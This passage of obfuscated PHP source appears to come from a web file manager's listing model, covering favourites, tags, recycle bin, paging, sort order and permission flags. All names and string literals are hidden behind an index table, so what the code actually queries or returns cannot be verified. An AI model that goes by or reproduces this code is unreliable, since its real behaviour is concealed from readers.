array($³ø¸ñ³§[7], $¶úê¢ê³)))->select(); $this->_listDataApply($§€ŒüÎ, $™ŸÔğ¿¼); return array_to_keyvalue($§€ŒüÎ, $³ø¸ñ³§[193]); } public function pathInfoFilter(&$…Õß×ıØ) { $Ñß¿ò—• =& $_SERVER[óÔë„ú]; static $‚œ¦˜Õ = false; static $„ğä˜îê = false; static $·±ŒÁ‘Š = false; if (!$‚œ¦˜Õ) { $ê¥ß¥½ = $Ñß¿ò—•[478]; $ê¥ß¥½ .= $Ñß¿ò—•[479]; $ê¥ß¥½ .= $Ñß¿ò—•[480]; $±¶‡çûÈ = $Ñß¿ò—•[481]; $áèÙµÕ× = explode($Ñß¿ò—•[50], $±¶‡çûÈ); $‚œ¦˜Õ = explode($Ñß¿ò—•[50], $ê¥ß¥½); $„ğä˜îê = array(); foreach ($‚œ¦˜Õ as $ˆ¿¯†¨à) { if (in_array($ˆ¿¯†¨à, $áèÙµÕ×)) { continue; } $„ğä˜îê[] = $ˆ¿¯†¨à; } $·±ŒÁ‘Š = explode($Ñß¿ò—•[50], $Ñß¿ò—•[482]); } foreach ($·±ŒÁ‘Š as $ÕŠ“¡¥) { if (isset($…Õß×ıØ[$ÕŠ“¡¥])) { $…Õß×ıØ[$ÕŠ“¡¥] = intval($…Õß×ıØ[$ÕŠ“¡¥]); } } $…Õß×ıØ[$Ñß¿ò—•[87]] = $Ñß¿ò—•[483] . $…Õß×ıØ[$Ñß¿ò—•[193]] . $Ñß¿ò—•[484]; $…Õß×ıØ[$Ñß¿ò—•[33]] = $…Õß×ıØ[$Ñß¿ò—•[485]] == 1 ? $Ñß¿ò—•[78] : $Ñß¿ò—•[230]; $…Õß×ıØ[$Ñß¿ò—•[190]] = $this->typeName($…Õß×ıØ[$Ñß¿ò—•[190]]); if ($…Õß×ıØ[$Ñß¿ò—•[485]] != 1) { $…Õß×ıØ[$Ñß¿ò—•[169]] = $…Õß×ıØ[$Ñß¿ò—•[486]]; unset($…Õß×ıØ[$Ñß¿ò—•[486]]); } $·Šë¢‹å = $‚œ¦˜Õ; if (isset($…Õß×ıØ[$Ñß¿ò—•[487]]) && $…Õß×ıØ[$Ñß¿ò—•[487]][$Ñß¿ò—•[488]] == -1) { $·Šë¢‹å = $„ğä˜îê; } $…Õß×ıØ = array_field_key($…Õß×ıØ, $·Šë¢‹å); return $…Õß×ıØ; } public function listUserFav() { $¥¯å†¦î =& $_SERVER[óÔë„ú]; $ ÛÓé™ = Model($¥¯å†¦î[489])->listData(); $öŠŠıí = array_filter_by_field($ ÛÓé™, $¥¯å†¦î[33], $¥¯å†¦î[490]); $öŠŠıí = array_to_keyvalue($öŠŠıí, $¥¯å†¦î[12], $¥¯å†¦î[87]); if ($öŠŠıí) { $…Õ“ ± = $this->listSource(array($¥¯å†¦î[491] => array($¥¯å†¦î[492], $öŠŠıí))); } $…Õ“ ± = array_to_keyvalue($…Õ“ ±[$¥¯å†¦î[445]], $¥¯å†¦î[193]); foreach ($ ÛÓé™ as &$¼×Àöİª) { $¼×Àöİª = array($¥¯å†¦î[493] => $¼×Àöİª[$¥¯å†¦î[475]], $¥¯å†¦î[494] => $¼×Àöİª[$¥¯å†¦î[32]], $¥¯å†¦î[495] => $¼×Àöİª[$¥¯å†¦î[87]], $¥¯å†¦î[496] => $¼×Àöİª[$¥¯å†¦î[33]], $¥¯å†¦î[497] => $¼×Àöİª[$¥¯å†¦î[231]], $¥¯å†¦î[498] => $¼×Àöİª[$¥¯å†¦î[88]]); if ($¼×Àöİª[$¥¯å†¦î[33]] == $¥¯å†¦î[490] && $…Õ“ ±[$¼×Àöİª[$¥¯å†¦î[87]]]) { $¼×Àöİª[$¥¯å†¦î[90]] = $…Õ“ ±[$¼×Àöİª[$¥¯å†¦î[87]]]; } } unset($¼×Àöİª); return $ ÛÓé™; } public function listUserTag($¨ßÀ¼¸Û) { $¢öö¸¹ã =& $_SERVER[óÔë„ú]; if ($¨ßÀ¼¸Û && !is_array($¨ßÀ¼¸Û)) { $¨ßÀ¼¸Û = array($¨ßÀ¼¸Û); } $ë¥ø˜ƒ­ = Model($¢öö¸¹ã[499])->listData(); $ƒ˜¦³²İ = array(); $Ï½é‚„ë = array(); foreach ($ë¥ø˜ƒ­ as $û«¶¦) { $§Ô’ö© = $û«¶¦[$¢öö¸¹ã[87]]; if (!$§Ô’ö©) { continue; } if (!isset($Ï½é‚„ë[$§Ô’ö©])) { $Ï½é‚„ë[$§Ô’ö©] = array(); } $Ï½é‚„ë[$§Ô’ö©][] = $û«¶¦[$¢öö¸¹ã[500]]; $ƒ˜¦³²İ[$û«¶¦[$¢öö¸¹ã[87]]] = $û«¶¦; } $éÖäšŠÍ = array(); $ƒâ¦˜öÈ = array(); $·×ØÚç¥ = array(); foreach ($Ï½é‚„ë as $ºÈÌ¸µÍ => $§œğ”Á) { $‡â“øÁÓ = !0; if (!$¨ßÀ¼¸Û) { $éÖäšŠÍ[] = $ºÈÌ¸µÍ; continue; } foreach ($¨ßÀ¼¸Û as $ŒÓ¼§“Ã) { if (!in_array($ŒÓ¼§“Ã, $§œğ”Á)) { $‡â“øÁÓ = !1; break; } } if (!$‡â“øÁÓ) { continue; } if (!is_numeric($ºÈÌ¸µÍ)) { $³ªÅº„Ë = $ƒ˜¦³²İ[$ºÈÌ¸µÍ]; $„Ê¢²´Ş = array($¢öö¸¹ã[32] => $³ªÅº„Ë[$¢öö¸¹ã[32]], $¢öö¸¹ã[87] => $³ªÅº„Ë[$¢öö¸¹ã[87]], $¢öö¸¹ã[33] => $³ªÅº„Ë[$¢öö¸¹ã[33]], $¢öö¸¹ã[90] => array($¢öö¸¹ã[501] => 1), $¢öö¸¹ã[232] => !0); if ($³ªÅº„Ë[$¢öö¸¹ã[33]] == $¢öö¸¹ã[230]) { $·×ØÚç¥[] = $„Ê¢²´Ş; } if ($³ªÅº„Ë[$¢öö¸¹ã[33]] == $¢öö¸¹ã[78]) { $ƒâ¦˜öÈ[] = $„Ê¢²´Ş; } continue; } $éÖäšŠÍ[] = $ºÈÌ¸µÍ; } if ($éÖäšŠÍ) { $€–—Ÿ¥¡ = $this->listSource(array($¢öö¸¹ã[491] => array($¢öö¸¹ã[492], $éÖäšŠÍ))); } $€–—Ÿ¥¡ = $€–—Ÿ¥¡ ? $€–—Ÿ¥¡ : array($¢öö¸¹ã[85] => array(), $¢öö¸¹ã[86] => array()); $€–—Ÿ¥¡[$¢öö¸¹ã[85]] = array_merge($€–—Ÿ¥¡[$¢öö¸¹ã[85]], $ƒâ¦˜öÈ); $€–—Ÿ¥¡[$¢öö¸¹ã[86]] = array_merge($€–—Ÿ¥¡[$¢öö¸¹ã[86]], $·×ØÚç¥); if (isset($€–—Ÿ¥¡[$¢öö¸¹ã[442]]) && count($éÖäšŠÍ) == $€–—Ÿ¥¡[$¢öö¸¹ã[442]][$¢öö¸¹ã[443]]) { return $€–—Ÿ¥¡; } $Û·•ò° = array(); $´¡¸é×Â = array_to_keyvalue($€–—Ÿ¥¡[$¢öö¸¹ã[85]], $¢öö¸¹ã[12], $¢öö¸¹ã[193]); $Ç‹ÛªÊÖ = array_to_keyvalue($€–—Ÿ¥¡[$¢öö¸¹ã[86]], $¢öö¸¹ã[12], $¢öö¸¹ã[193]); $à´£ˆ¹‹ = array_merge($Ç‹ÛªÊÖ, $´¡¸é×Â); foreach ($éÖäšŠÍ as $§Ô’ö©) { if (!in_array($§Ô’ö©, $à´£ˆ¹‹)) { $Û·•ò°[] = $§Ô’ö©; } } if ($Û·•ò°) { Model($¢öö¸¹ã[502])->removeBySource($Û·•ò°); } return $€–—Ÿ¥¡; } public function listUserRecycle() { $ÒŠ¦÷ç¦ =& $_SERVER[óÔë„ú]; $ŒŒ§è‘§ = Model($ÒŠ¦÷ç¦[503])->listData(); if (!$ŒŒ§è‘§) { return array(); } $¶¥›¸Ñá = array($ÒŠ¦÷ç¦[491] => array($ÒŠ¦÷ç¦[492], $ŒŒ§è‘§), $ÒŠ¦÷ç¦[504] => 1); return $this->listSource($¶¥›¸Ñá); } public function listSource($÷÷œÈù, $ÍÜìåØ« = 3000, $’İ…ß¢œ = false) { $˜¹‹¾â® =& $_SERVER[óÔë„ú]; if (!isset($÷÷œÈù[$˜¹‹¾â®[505]])) { $÷÷œÈù[$˜¹‹¾â®[505]] = 0; } if (isset($÷÷œÈù[$˜¹‹¾â®[192]]) && $÷÷œÈù[$˜¹‹¾â®[192]] == $˜¹‹¾â®[228]) { $÷÷œÈù[$˜¹‹¾â®[486]] = array($˜¹‹¾â®[407], $˜¹‹¾â®[506]); } $’Û”„ßµ = $˜¹‹¾â®[507]; $ì¸¬±½ = $this->field($’Û”„ßµ)->_makeOrder()->where($÷÷œÈù)->selectPage($ÍÜìåØ«); $this->_listPageCheck($ì¸¬±½, $’Û”„ßµ, $÷÷œÈù); $this->_listDataApply($ì¸¬±½[$˜¹‹¾â®[445]], $’İ…ß¢œ); $this->_listMake($ì¸¬±½); return $ì¸¬±½; } private function _listPageCheck(&$‰“–Õôû, $äüïÖá», $‘¶–Íõ„) { $˜ûê°ä¥ =& $_SERVER[óÔë„ú]; if (!is_array($‰“–Õôû[$˜ûê°ä¥[442]])) { return; } $€¤ƒˆÍË = $‰“–Õôû[$˜ûê°ä¥[442]]; if ($€¤ƒˆÍË[$˜ûê°ä¥[444]] <= 1) { return; } if ($€¤ƒˆÍË[$˜ûê°ä¥[443]] >= 100000) { return; } if (Model($˜ûê°ä¥[508])->get($˜ûê°ä¥[509]) != $˜ûê°ä¥[510]) { return; } $äüïÖá» = str_replace(array($˜ûê°ä¥[53], $˜ûê°ä¥[418], $˜ûê°ä¥[262]), $˜ûê°ä¥[12], $äüïÖá»); $äüïÖá» = $˜ûê°ä¥[511] . str_replace($˜ûê°ä¥[50], $˜ûê°ä¥[512], $äüïÖá») . $˜ûê°ä¥[513]; $‡»â¸ßÔ = $˜ûê°ä¥[514]; $‡»â¸ßÔ = $‡»â¸ßÔ . $˜ûê°ä¥[515]; $Ò›˜Ô›ç = $€¤ƒˆÍË[$˜ûê°ä¥[439]] * ($€¤ƒˆÍË[$˜ûê°ä¥[429]] - 1) . $˜ûê°ä¥[50] . $€¤ƒˆÍË[$˜ûê°ä¥[439]]; $Ã¹òˆ„Õ = $this->_makeOrder(!0); $µ•Áå‘ã = $˜ûê°ä¥[511] . str_replace($˜ûê°ä¥[50], $˜ûê°ä¥[512], $Ã¹òˆ„Õ[0]); if (strpos($µ•Áå‘ã, $˜ûê°ä¥[516])) { $µ•Áå‘ã = str_replace($˜ûê°ä¥[516], $˜ûê°ä¥[517], $µ•Áå‘ã); } else { $µ•Áå‘ã .= $˜ûê°ä¥[518] . $Ã¹òˆ„Õ[1]; } $ğ¾­îó = array(); foreach ($‘¶–Íõ„ as $êÌÇŒ­ => $¿öóÜÀœ) { $ğ¾­îó[$˜ûê°ä¥[511] . $êÌÇŒ­] = $¿öóÜÀœ; } $this->alias($˜ûê°ä¥[519])->field($äüïÖá»)->limit($Ò›˜Ô›ç)->order($µ•Áå‘ã); $Ğôîœ» = $this->join($‡»â¸ßÔ)->where($ğ¾­îó)->select(); if ($Ğôîœ») { $‰“–Õôû[$˜ûê°ä¥[445]] = $Ğôîœ»; } } protected function _makeOrder($†á›ÔÃÌ = false) { $êş¨Â§ =& $_SERVER[óÔë„ú]; $®òü€€é = Model($êş¨Â§[520])->get($êş¨Â§[521]); $«Ãü¢ä¡ = Model($êş¨Â§[520])->get($êş¨Â§[522]); $äüâû˜ = array($êş¨Â§[523] => $êş¨Â§[524], $êş¨Â§[525] => $êş¨Â§[526]); $§Ì§ãÄ¶ = array($êş¨Â§[32] => $êş¨Â§[32], $êş¨Â§[79] => $êş¨Â§[79], $êş¨Â§[169] => $êş¨Â§[486], $êş¨Â§[527] => $êş¨Â§[527], $êş¨Â§[528] => $êş¨Â§[529], $êş¨Â§[231] => $êş¨Â§[231], $êş¨Â§[88] => $êş¨Â§[88]); $“ÓˆÕô = Input::get($êş¨Â§[530], $êş¨Â§[7], $®òü€€é, array_keys($§Ì§ãÄ¶)); $¾áèû® = Input::get($êş¨Â§[531], $êş¨Â§[7], $«Ãü¢ä¡, array_keys($äüâû˜)); if (!in_array($“ÓˆÕô, array_keys($§Ì§ãÄ¶))) { $“ÓˆÕô = $êş¨Â§[32]; } if (!in_array($¾áèû®, array_keys($äüâû˜))) { $“ÓˆÕô = $êş¨Â§[523]; } if ($“ÓˆÕô == $êş¨Â§[32]) { } $¦¬£Ÿˆ¸ = $êş¨Â§[532] . $§Ì§ãÄ¶[$“ÓˆÕô] . $êş¨Â§[53] . $äüâû˜[$¾áèû®]; $¦¬£Ÿˆ¸ = rtrim(trim($¦¬£Ÿˆ¸), $êş¨Â§[50]); if ($†á›ÔÃÌ) { return array($¦¬£Ÿˆ¸, $äüâû˜[$¾áèû®]); } return $this->order($¦¬£Ÿˆ¸); } protected function _listDataApplyItem($ö±¿ù¾ì, $Ğõ÷ä¶ß = false) { $Â¬Ÿ´³ë = array($ö±¿ù¾ì); $this->_listDataApply($Â¬Ÿ´³ë, $Ğõ÷ä¶ß); return $Â¬Ÿ´³ë[0]; } protected function _listDataApply(&$ÛóÁ‡¼§, $¹£—ƒœ = false) { $Ë›¸ƒŞ =& $_SERVER[óÔë„ú]; if (!$ÛóÁ‡¼§) { $ÛóÁ‡¼§ = array(); return; } $ºö°‹øÍ = array_to_keyvalue($ÛóÁ‡¼§, $Ë›¸ƒŞ[12], $Ë›¸ƒŞ[193]); $ºö°‹øÍ = array_unique($ºö°‹øÍ); $this->_listSourceCache($ÛóÁ‡¼§); if (!$¹£—ƒœ) { $this->_listAppendMeta($ÛóÁ‡¼§, $ºö°‹øÍ); $this->_listAppendFileMeta($ÛóÁ‡¼§, $ºö°‹øÍ); $this->_listAppendChildren($ÛóÁ‡¼§, $ºö°‹øÍ); } $this->_listAppendPath($ÛóÁ‡¼§); $this->_listAppendAuth($ÛóÁ‡¼§); $this->_listAppendSourceInfo($ÛóÁ‡¼§, $ºö°‹øÍ); $this->_listAppendUser($ÛóÁ‡¼§); $this->_listFilterInfo($ÛóÁ‡¼§, $¹£—ƒœ); $this->_listAppendAuthSecret($ÛóÁ‡¼§); } protected function _listSourceCache($ÀËÏ·) { $¨¸´ıÜ€ =& $_SERVER[óÔë„ú]; foreach ($ÀËÏ· as $õÀıõÕÏ) { self::$cacheSourceInfo[$¨¸´ıÜ€[533] . $õÀıõÕÏ[$¨¸´ıÜ€[193]]] = $õÀıõÕÏ; } } protected function _listFilterInfo(&$Ÿ©°©­€, $ËşÔÀå = false) { $Šƒ„êó =& $_SERVER[óÔë„ú]; foreach ($Ÿ©°©­€ as &$÷µ’¸ƒı) { $÷µ’¸ƒı = $this->pathInfoFilter($÷µ’¸ƒı); self::$cachePathInfo[$Šƒ„êó[534] . intval($ËşÔÀå) . $Šƒ„êó[462] . $÷µ’¸ƒı[$Šƒ„êó[193]]] = $÷µ’¸ƒı; } unset($÷µ’¸ƒı); } protected function _listMake(&$‰¥Ü“àï) { $Ìˆ€ğ‡½ =& $_SERVER[óÔë„ú]; $‰¥Ü“àï[$Ìˆ€ğ‡½[85]] = array(); $‰¥Ü“àï[$Ìˆ€ğ‡½[86]] = array(); foreach ($‰¥Ü“àï[$Ìˆ€ğ‡½[445]] as $ªªãúÌ…) { $•Ğııø = $ªªãúÌ…[$Ìˆ€ğ‡½[485]] == 1 ? $Ìˆ€ğ‡½[85] : $Ìˆ€ğ‡½[86]; $‰¥Ü“àï[$•Ğııø][] = $ªªãúÌ…; } unset($‰¥Ü“àï[$Ìˆ€ğ‡½[445]]); } protected function _listAppendMeta(&$óûœ¬è, $Û¥¬ü–ğ) { $ĞÀ’Şëƒ =& $_SERVER[óÔë„ú]; $½ÖêÓãç = array($ĞÀ’Şëƒ[491] => array($ĞÀ’Şëƒ[492], $Û¥¬ü–ğ)); $½Õ»¦¯ = Model($ĞÀ’Şëƒ[535])->field($ĞÀ’Şëƒ[536])->where($½ÖêÓãç)->select(); if (!$½Õ»¦¯) { return; } $Ïó™‰®® = array($ĞÀ’Şëƒ[537], $ĞÀ’Şëƒ[538], $ĞÀ’Şëƒ[517]); $®ÃäÏİ— = array(); foreach ($½Õ»¦¯ as $¡µã¸ƒ¡) { if (!isset($®ÃäÏİ—[$¡µã¸ƒ¡[$ĞÀ’Şëƒ[193]]])) { $®ÃäÏİ—[$¡µã¸ƒ¡[$ĞÀ’Şëƒ[193]]] = array(); } if (in_array($¡µã¸ƒ¡[$ĞÀ’Şëƒ[97]], $Ïó™‰®®)) { continue; } $®ÃäÏİ—[$¡µã¸ƒ¡[$ĞÀ’Şëƒ[193]]][$¡µã¸ƒ¡[$ĞÀ’Şëƒ[97]]] = $¡µã¸ƒ¡[$ĞÀ’Şëƒ[450]]; } foreach ($óûœ¬è as &$ëÓÚÄïõ) { $ëÓÚÄïõ[$ĞÀ’Şëƒ[539]] = !1; if (isset($®ÃäÏİ—[$ëÓÚÄïõ[$ĞÀ’Şëƒ[193]]])) { $ëÓÚÄïõ[$ĞÀ’Şëƒ[539]] = $®ÃäÏİ—[$ëÓÚÄïõ[$ĞÀ’Şëƒ[193]]]; } if ($this->fileIsLock($ëÓÚÄïõ) && $ëÓÚÄïõ[$ĞÀ’Şëƒ[487]]) { $é¸äÃÎ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ëÓÚÄïõ[$ĞÀ’Şëƒ[487]][$ĞÀ’Şëƒ[488]] = AuthModel::authDisable($ëÓÚÄïõ[$ĞÀ’Şëƒ[487]][$ĞÀ’Şëƒ[488]], $é¸äÃÎ); $ëÓÚÄïõ[$ĞÀ’Şëƒ[487]][$ĞÀ’Şëƒ[540]][$ĞÀ’Şëƒ[487]] = $ëÓÚÄïõ[$ĞÀ’Şëƒ[487]][$ĞÀ’Şëƒ[488]]; } } unset($ëÓÚÄïõ); } protected function _listAppendFileMeta(&$”™–´”ï, $…©‰¾¬ê) { $í¿«¼» =& $_SERVER[óÔë„ú]; $Ë§ÙñöŒ = array_to_keyvalue($”™–´”ï, $í¿«¼»[12], $í¿«¼»[541]); $Ë§ÙñöŒ = array_filter(array_unique($Ë§ÙñöŒ)); if (!$Ë§ÙñöŒ) { return; } $â·‚Úò = array($í¿«¼»[542] => array($í¿«¼»[492], $Ë§ÙñöŒ)); $û€µ©ª¡ = $í¿«¼»[543]; $—ş­×ìı = Model($í¿«¼»[544])->field($û€µ©ª¡)->where($â·‚Úò)->select(); $—ş­×ìı = array_to_keyvalue($—ş­×ìı, $í¿«¼»[541]); $Œß¯î = Model($í¿«¼»[545])->field($í¿«¼»[546])->where($â·‚Úò)->select(); $Œß¯î = $Œß¯î ? $Œß¯î : array(); $¬ıÎ»À© = array(); foreach ($Œß¯î as $¿–²üôÇ) { if (!isset($¬ıÎ»À©[$¿–²üôÇ[$í¿«¼»[541]]])) { $¬ıÎ»À©[$¿–²üôÇ[$í¿«¼»[541]]] = array(); } $¬ıÎ»À©[$¿–²üôÇ[$í¿«¼»[541]]][$¿–²üôÇ[$í¿«¼»[97]]] = $¿–²üôÇ[$í¿«¼»[450]]; } foreach ($”™–´”ï as &$‚ç½®¬ƒ) { $éüˆ› = $‚ç½®¬ƒ[$í¿«¼»[541]]; if (!$éüˆ› || !is_array($—ş­×ìı[$éüˆ›])) { continue; } $ßÍÇå•ˆ = $—ş­×ìı[$éüˆ›]; $ßÍÇå•ˆ[$í¿«¼»[79]] = $‚ç½®¬ƒ[$í¿«¼»[79]]; $ßÍÇå•ˆ[$í¿«¼»[32]] = $‚ç½®¬ƒ[$í¿«¼»[32]]; if (!$ßÍÇå•ˆ[$í¿«¼»[547]]) { Model($í¿«¼»[544])->fileMd5Check($ßÍÇå•ˆ); } if (!isset(self::$cacheFileInfo[$í¿«¼»[548] . $éüˆ›])) { self::$cacheFileInfo[$í¿«¼»[548] . $éüˆ›] = array_merge(array(), $ßÍÇå•ˆ); } unset($—ş­×ìı[$éüˆ›][$í¿«¼»[87]]); $“ŞÛÌ¬ = isset($¬ıÎ»À©[$éüˆ›]) && is_array($¬ıÎ»À©[$éüˆ›]) ? $¬ıÎ»À©[$éüˆ›] : array(); $‚ç½®¬ƒ[$í¿«¼»[170]] = array_merge($“ŞÛÌ¬, $—ş­×ìı[$éüˆ›]); if (isset($‚ç½®¬ƒ[$í¿«¼»[170]][$í¿«¼»[184]])) { $‚ç½®¬ƒ[$í¿«¼»[184]] = json_decode($‚ç½®¬ƒ[$í¿«¼»[170]][$í¿«¼»[184]], !0); unset($‚ç½®¬ƒ[$í¿«¼»[170]][$í¿«¼»[184]]); } } unset($‚ç½®¬ƒ); } protected function _listAppendSourceInfo(&$÷óù–åµ, $Å¦ùÏçè) { $öÂ€Ñ€¦ =& $_SERVER[óÔë„ú]; $ÎÀ§÷Æ = Model($öÂ€Ñ€¦[549])->listData(); $‡‡Ë“Ä = Model($öÂ€Ñ€¦[499])->listData(); $¹•´²é = Model($öÂ€Ñ€¦[489])->listData(); $À«Ü¯¡× = Model($öÂ€Ñ€¦[550])->listSimple(); $ØùÄ˜ç = array_to_keyvalue($ÎÀ§÷Æ, $öÂ€Ñ€¦[475]); $Ñ¯ ãÕ¤ = array_to_keyvalue_group($‡‡Ë“Ä, $öÂ€Ñ€¦[87], $öÂ€Ñ€¦[500]); $¾å²õ”Ê = array_to_keyvalue($¹•´²é, $öÂ€Ñ€¦[87]); $È«ëÚ×» = array_to_keyvalue_group($À«Ü¯¡×, $öÂ€Ñ€¦[193]); foreach ($÷óù–åµ as &$™ÃÁÁ…¬) { $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]] = array($öÂ€Ñ€¦[551] => 0, $öÂ€Ñ€¦[552] => 0, $öÂ€Ñ€¦[553] => 0); if (isset($¾å²õ”Ê[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]])) { $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[554]] = 1; $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[555]] = $¾å²õ”Ê[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]][$öÂ€Ñ€¦[32]]; } if ($Ñ¯ ãÕ¤ && $ØùÄ˜ç && isset($Ñ¯ ãÕ¤[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]])) { $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[556]] = array(); foreach ($Ñ¯ ãÕ¤[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]] as $Ô‘¯Òô) { $ó„ÎÜÆÀ = $ØùÄ˜ç[$Ô‘¯Òô]; $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[556]][] = array($öÂ€Ñ€¦[557] => $ó„ÎÜÆÀ[$öÂ€Ñ€¦[475]], $öÂ€Ñ€¦[494] => $ó„ÎÜÆÀ[$öÂ€Ñ€¦[32]], $öÂ€Ñ€¦[558] => $ó„ÎÜÆÀ[$öÂ€Ñ€¦[559]]); } } if ($È«ëÚ×» && isset($È«ëÚ×»[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]])) { $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[560]] = array(); foreach ($È«ëÚ×»[$™ÃÁÁ…¬[$öÂ€Ñ€¦[193]]] as $¶ò¸½¡–) { $ùƒíï«İ = $öÂ€Ñ€¦[561]; if ($¶ò¸½¡–[$öÂ€Ñ€¦[562]] == $öÂ€Ñ€¦[91]) { $ùƒíï«İ .= $öÂ€Ñ€¦[563]; } $™ÃÁÁ…¬[$öÂ€Ñ€¦[90]][$öÂ€Ñ€¦[560]] = array_field_key($¶ò¸½¡–, explode($öÂ€Ñ€¦[50], $ùƒíï«İ)); } } } unset($™ÃÁÁ…¬); return $÷óù–åµ; } protected function _listAppendChildren(&$í•ŠöÜè, $†ÁÔÍ§•) { $œ‹“¸Ï =& $_SERVER[óÔë„ú]; $ºí‘æšÙ = array(); $ó¾«§ó = array($œ‹“¸Ï[239] => 0, $œ‹“¸Ï[240] => 0); foreach ($í•ŠöÜè as &$÷ˆÂÍ¯) { if (!$÷ˆÂÍ¯[$œ‹“¸Ï[485]]) { continue; } $ºí‘æšÙ[] = $÷ˆÂÍ¯[$œ‹“¸Ï[193]]; } unset($÷ˆÂÍ¯); if (!$ºí‘æšÙ) { return; } $‚›ÂÕ«Ì = array($œ‹“¸Ï[192] => array($œ‹“¸Ï[7], $ºí‘æšÙ), $œ‹“¸Ï[505] => 0); $õ³—¦°õ = array($œ‹“¸Ï[192], $œ‹“¸Ï[485], $œ‹“¸Ï[564] => $œ‹“¸Ï[565]); $¼ÍÃ««ù = $this->field($õ³—¦°õ)->where($‚›ÂÕ«Ì)->group($œ‹“¸Ï[566])->select(); $±º¦¥Ôø = array(); foreach ($¼ÍÃ««ù as $œ¥¨»¸²) { $–‹™ÂÉÒ = $œ¥¨»¸²[$œ‹“¸Ï[192]]; $¯×Ë¡²× = $œ¥¨»¸²[$œ‹“¸Ï[485]] == $œ‹“¸Ï[91] ? $œ‹“¸Ï[240] : $œ‹“¸Ï[239]; if (!isset($±º¦¥Ôø[$–‹™ÂÉÒ])) { $±º¦¥Ôø[$–‹™ÂÉÒ] = array($œ‹“¸Ï[239] => 0, $œ‹“¸Ï[240] => 0); } $±º¦¥Ôø[$–‹™ÂÉÒ][$¯×Ë¡²×] += $œ¥¨»¸²[$œ‹“¸Ï[565]]; } foreach ($í•ŠöÜè as &$÷ˆÂÍ¯) { if (!$÷ˆÂÍ¯[$œ‹“¸Ï[485]]) { continue; } $éş­²Ş = is_array($±º¦¥Ôø[$÷ˆÂÍ¯[$œ‹“¸Ï[193]]]) ? $±º¦¥Ôø[$÷ˆÂÍ¯[$œ‹“¸Ï[193]]] : $ó¾«§ó; $÷ˆÂÍ¯[$œ‹“¸Ï[240]] = $éş­²Ş[$œ‹“¸Ï[240]]; $÷ˆÂÍ¯[$œ‹“¸Ï[239]] = $éş­²Ş[$œ‹“¸Ï[239]]; unset($÷ˆÂÍ¯[$œ‹“¸Ï[486]]); } unset($÷ˆÂÍ¯); } protected function _listAppendAuth(&$¼æ£Ñ¡²) { $œäÚ™¾® =& $_SERVER[óÔë„ú]; $¢§ûµİ = array(); foreach ($¼æ£Ñ¡² as $©Ò¦ìÈş) { if ($©Ò¦ìÈş[$œäÚ™¾®[190]] == self::TYPE_GROUP) { $¢§ûµİ[] = $©Ò¦ìÈş[$œäÚ™¾®[193]]; } } if (!$¢§ûµİ) { return; } $¾¼…´¶Ö = array_to_keyvalue($¼æ£Ñ¡², $œäÚ™¾®[193]); $«ÂîäÛï = Model($œäÚ™¾®[567])->getSourceList($¢§ûµİ, $¾¼…´¶Ö); $´Ç¬êß± = KodUser::isRoot(); foreach ($¼æ£Ñ¡² as $ÛáİÙÚÅ => &$©Ò¦ìÈş) { $©Ò¦ìÈş[$œäÚ™¾®[487]] = $«ÂîäÛï[$©Ò¦ìÈş[$œäÚ™¾®[193]]]; if (!$©Ò¦ìÈş[$œäÚ™¾®[487]] && $©Ò¦ìÈş[$œäÚ™¾®[190]] == self::TYPE_GROUP) { $©Ò¦ìÈş[$œäÚ™¾®[487]] = Action($œäÚ™¾®[568])->pathGroupAuthMake($©Ò¦ìÈş[$œäÚ™¾®[569]]); if (!$©Ò¦ìÈş[$œäÚ™¾®[487]] && !$´Ç¬êß±) { $©Ò¦ìÈş[$œäÚ™¾®[233]] = !1; $©Ò¦ìÈş[$œäÚ™¾®[232]] = !1; } } if ($©Ò¦ìÈş[$œäÚ™¾®[487]]) { $©Ò¦ìÈş[$œäÚ™¾®[233]] = AuthModel::authCheckEdit($©Ò¦ìÈş[$œäÚ™¾®[487]][$œäÚ™¾®[488]]); $©Ò¦ìÈş[$œäÚ™¾®[232]] = AuthModel::authCheckView($©Ò¦ìÈş[$œäÚ™¾®[487]][$œäÚ™¾®[488]]); } $this->groupPathDisplay($©Ò¦ìÈş); } unset($©Ò¦ìÈş); } public function _listAppendAuthSecret(&$¥ú¢É¶’) { $¦´¿Œø’ =& $_SERVER[óÔë„ú]; if (Model($¦´¿Œø’[508])->get($¦´¿Œø’[570]) != $¦´¿Œø’[91]) { return; } static $šóÓĞ¯ = false; if (!$šóÓĞ¯) { $íë÷ßÌû = Model($¦´¿Œø’[571]); $Œ›´è£š = Model($¦´¿Œø’[572]); $šóÓĞ¯ = $Œ›´è£š->listData(); $šóÓĞ¯ = array_to_keyvalue($šóÓĞ¯, $¦´¿Œø’[193]); $ÈêÜÉÌ = json_decode(Model($¦´¿Œø’[508])->get($¦´¿Œø’[573]), !0); $ÈêÜÉÌ = array_to_keyvalue($ÈêÜÉÌ, $¦´¿Œø’[475]); foreach ($šóÓĞ¯ as $Û±ñòÃ” => $„‡ØëåÁ) { $«†›ûÒ = $ÈêÜÉÌ[$„‡ØëåÁ[$¦´¿Œø’[574]]]; if (!$«†›ûÒ) { $Œ›´è£š->remove($„‡ØëåÁ[$¦´¿Œø’[475]]); unset($šóÓĞ¯[$Û±ñòÃ”]); continue; } $îÃ„‚ıÍ = $íë÷ßÌû->listData($«†›ûÒ[$¦´¿Œø’[487]]); if (!$îÃ„‚ıÍ) { $Œ›´è£š->remove($„‡ØëåÁ[$¦´¿Œø’[475]]); unset($šóÓĞ¯[$Û±ñòÃ”]); continue; } $„‡ØëåÁ[$¦´¿Œø’[487]] = $îÃ„‚ıÍ; $„‡ØëåÁ[$¦´¿Œø’[575]] = $«†›ûÒ; $„‡ØëåÁ[$¦´¿Œø’[576]] = Model($¦´¿Œø’[577])->getInfoSimpleOuter($„‡ØëåÁ[$¦´¿Œø’[527]]); 